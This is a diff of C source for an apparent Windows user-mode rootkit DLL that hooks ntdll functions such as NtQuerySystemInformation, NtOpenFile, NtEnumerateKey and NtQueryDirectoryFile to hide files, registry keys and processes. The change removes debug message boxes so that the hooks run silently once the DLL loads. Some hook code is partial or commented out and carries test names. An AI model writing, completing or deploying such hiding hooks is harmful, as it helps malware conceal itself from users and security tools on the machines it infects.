@@ -255,7 +255,6 @@ NTSTATUS WINAPI NewNtEnumerateKey(
 
 			if (mustShiftReg(dbg))
 				{
-					MessageBoxW(0, dbg.Buffer, L"Regedit", MB_OK | MB_ICONERROR);
 					InitializeObjectAttributes(&ObjectAttributes, &usKey, 0, KeyHandle, NULL);
 					TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
 					NTSTATUS status;
@@ -712,14 +711,12 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 
 		if (strcmp(name, "EXAMPLE.txt") == 0 || isPartOf(name, "a"))
 		{
-		MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
 		hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
 		}
 		}
 
 		return ret;
 		*/
-		//MessageBox(0, "HOOKED FW", "HookTest", MB_OK | MB_ICONERROR);
 		WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;
 
 		char name[512] = "";
@@ -732,7 +729,6 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 		BOOL ret = originalFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
 		if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
 		{
-			MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
 			ret = originalFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
 		}
 		return ret;
@@ -770,7 +766,6 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 	TCHAR sPath[MAX_PATH];
 	//DWORD dwRet;
 	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-	MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
 	WriteFile();
 	//if (!mustHideFile(*sPath))
 	//NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
@@ -785,7 +780,6 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 	//TCHAR sPath[MAX_PATH];
 	//DWORD dwRet;
 	//dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-	MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
 	//if (!mustHideFile(*sPath))
 	NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
 	CreateOptions, EaBuffer, EaLength);
@@ -835,7 +829,6 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 	switch (dwReason)
 	{
 	case DLL_PROCESS_ATTACH:
-	MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
 	hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
 	hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
 	hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
